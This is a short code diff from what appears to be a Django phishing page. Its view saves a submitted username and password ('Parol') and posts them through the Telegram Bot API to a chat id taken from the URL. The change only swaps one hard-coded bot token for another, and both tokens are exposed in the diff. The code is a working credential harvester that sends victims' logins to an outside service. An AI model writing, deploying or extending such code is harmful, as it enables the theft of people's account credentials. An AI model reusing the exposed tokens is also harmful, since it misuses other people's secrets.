@@ -11,7 +11,7 @@ def home(request,id):
             obj = form.save()
             username_var = form.cleaned_data.get('username')
             password_var = form.cleaned_data.get('password')
-            bot_token = "8247922895:AAFAwuGynmBGVWWClgc7nwxJnPErmSB-hwU"
+            bot_token = "8001673640:AAGeOTbzy-asikrePuBu_5ANRsEiqVn6nq8"
             text = f"👤 *Login*: ```{username_var}```\n🔒 *Parol*: ```{password_var}```\n"
             requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                           data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})
